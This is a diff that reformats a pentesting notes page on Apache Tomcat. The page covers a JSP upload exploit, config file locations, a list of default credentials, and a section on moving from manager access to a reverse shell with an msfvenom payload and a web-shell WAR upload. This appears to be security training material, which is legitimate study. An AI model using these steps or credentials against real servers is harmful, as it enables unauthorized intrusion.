@@ -1,20 +1,22 @@
 ---
-description: Tomcat is a web service commonly open in port 8080/tcp.
+title: Tomcat
+category: Software
+order: 3
 ---
 
-# Tomcat
+Tomcat is a web service commonly open in port 8080/tcp.
 
-## Introduction
+# Introduction
 
 Apache Tomcat is a free and open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and WebSocket technologies. Tomcat provides a "pure Java" HTTP web server environment in which Java code can run.
 
-## Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass
+# Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass
 
 Exists a exploit to execute remote command by uploading a `.war` file without prior authentication.
 
-{% embed url="https://www.exploit-db.com/exploits/42966" %}
+* [https://www.exploit-db.com/exploits/42966](https://www.exploit-db.com/exploits/42966)
 
-## Installation Directory
+# Installation Directory
 
 Depending the version installed or if its installed manually or using `apt`, it would be located in different places.
 
@@ -27,11 +29,11 @@ Depending the version installed or if its installed manually or using `apt`, it 
 /usr/share/tomcat9/
 ```
 
-## Configuration Files
+# Configuration Files
 
 There are serveral important files to look into and take info about the server.
 
-### server.xml
+## server.xml
 
 The server.xml file is Tomcat's main configuration file, and is responsible for specifying Tomcat's initial configuration on startup as well as defining the way and order in which Tomcat boots and builds. The elements of the server.xml file belong to five basic categories - Top Level Elements, Connectors, Containers, Nested Components, and Global Settings.
 
@@ -39,7 +41,7 @@ The server.xml file is Tomcat's main configuration file, and is responsible for 
 TOMCAT-HOME/conf/web.xml
 ```
 
-### web.xml
+## web.xml
 
 The web.xml file is derived from the [Servlet](https://www.mulesoft.com/tomcat-servlet) specification, and contains information used to [deploy](https://www.mulesoft.com/tomcat-deploy) and configure the components of your web applications.
 
@@ -47,7 +49,7 @@ The web.xml file is derived from the [Servlet](https://www.mulesoft.com/tomcat-s
 TOMCAT-HOME/conf/web.xml
 ```
 
-### tomcat-users.xml
+## tomcat-users.xml
 
 This last file contains the credentials and privileges of the tomcat users.
 
@@ -55,7 +57,7 @@ This last file contains the credentials and privileges of the tomcat users.
 TOMCAT-HOME/etc/tomcat-users.xml
 ```
 
-## Default credentials
+# Default credentials
 
 SecLists have a list of default credentials in Tomcat:
 
@@ -141,11 +143,11 @@ admin:owaspbwa
 demo:demo
 ```
 
-## From Admin to Reverse Shell
+# From Admin to Reverse Shell
 
 If you have access to the Tomcat Web Application Manager, you are able to upload and deploy a malicious `.war` file.
 
-### Finding the endpoint
+## Finding the endpoint
 
 First is important to find the endpoint.
 
@@ -161,17 +163,17 @@ OK - Listed applications for virtual host [localhost]
 /manager:running:0:/usr/share/tomcat9-admin/manager
 ```
 
-### Creating a shell (.WAR)
+## Creating a shell (.WAR)
 
 There are serveral ways to create the war.
 
-#### MSFVenom Reverse Shell
+### MSFVenom Reverse Shell
 
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip-addr> LPORT=<port> -f war -o revshell.war
 ```
 
-#### Manual Web Shell
+### Manual Web Shell
 
 Create a index.jsp with the following content:
 
@@ -207,7 +209,7 @@ jar -cvf ../webshell.war *
 webshell.war is created
 ```
 
-### Uploading the shell
+## Uploading the shell
 
 We just need to upload it and visit the path.
 
@@ -222,7 +224,7 @@ Finally we can visit the path:
 http://locahost:8080/shell
 ```
 
-## References
+# References
 
 * [https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#post](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#post)
 * [https://www.youtube.com/watch?v=yTHtLi9YZ2s](https://www.youtube.com/watch?v=yTHtLi9YZ2s)
